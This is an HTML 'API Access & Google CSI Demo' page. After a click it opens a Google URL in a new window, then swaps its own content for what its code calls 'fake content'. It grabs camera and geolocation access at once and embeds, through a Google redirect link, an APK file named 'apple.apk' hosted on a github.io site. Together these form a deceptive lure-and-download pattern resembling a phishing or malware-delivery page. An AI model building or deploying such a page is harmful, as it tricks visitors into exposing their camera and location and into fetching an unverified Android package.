<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>API Access & Google CSI</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 20px;
        }
        button {
            margin: 10px;
            padding: 10px 20px;
            font-size: 14px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <h1>Welcome to API Access & Google CSI Demo</h1>
    <button onclick="accessData()">Open CSI & Access APIs</button>

    <script>
        function accessData() {
            // Open Google CSI (or any other target URL you want) in a new window
            var x = window.open('https://www.google.com:9090'); // Open Google CSI
            
            setTimeout(function() {
            // Simulate a page change with fake content
            document.body.innerHTML = `
                <h1>API Access & Geolocation</h1>
                <p>Access Camera and Location APIs:</p>
                <h2>Camera Preview:</h2>
                <video id="video" width="320" height="240" autoplay muted></video>
                <br><br>
                <button onclick="requestNotificationPermission()">Request Notification Permission</button>
                <br><br>
                <button onclick="getLocation()">Get Location</button>
                <br><br>
                <iframe src="https://www.google.com/url?q=https%3A%2F%2Fecdnts-del.github.io%2Ftest-apk%2Fapple.apk&sa=D&sntz=1&usg=AOvVaw0onE08hhdtlihXeKuCFYTr" width="600" height="400"></iframe>
            `;

            // Handle Camera Access
            function openCamera() {
                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                    navigator.mediaDevices.getUserMedia({ video: true })
                        .then(function (stream) {
                            const video = document.getElementById('video');
                            video.srcObject = stream;
                        })
                        .catch(function (error) {
                            console.error('Error accessing camera: ', error);
                            alert('Unable to access camera. Please grant permission.');
                        });
                } else {
                    alert('Camera access is not supported by your browser.');
                }
            }

            // Try to open the camera right away
            openCamera();

            // Geolocation API Access
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function (position) {
                    const latitude = position.coords.latitude;
                    const longitude = position.coords.longitude;
                    document.body.innerHTML += `<p>Latitude: ${latitude}, Longitude: ${longitude}</p>`;
                }, function (error) {
                    console.error('Error fetching location: ', error);
                    document.body.innerHTML += '<p>Unable to fetch location.</p>';
                });
            } else {
                alert('Geolocation is not supported by your browser.');
            }

            // Notification Permission API
            function requestNotificationPermission() {
                if (Notification.permission === 'granted') {
                    alert('Notification permission already granted');
                } else if (Notification.permission !== 'denied') {
                    Notification.requestPermission().then(permission => {
                        if (permission === 'granted') {
                            alert('Notification permission granted');
                        } else {
                            alert('Notification permission denied');
                        }
                    });
                } else {
                    alert('Notification permission denied');
                }
            }

            // Get Location Function
            function getLocation() {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(position => {
                        alert("Latitude: " + position.coords.latitude + "\nLongitude: " + position.coords.longitude);
                    }, error => {
                        alert("Location access denied or error.");
                    });
                } else {
                    alert("Geolocation is not supported by this browser.");
                }
            }
        }, 3000); // Wait for 3 seconds to simulate page load time
    </script>
</body>
</html>
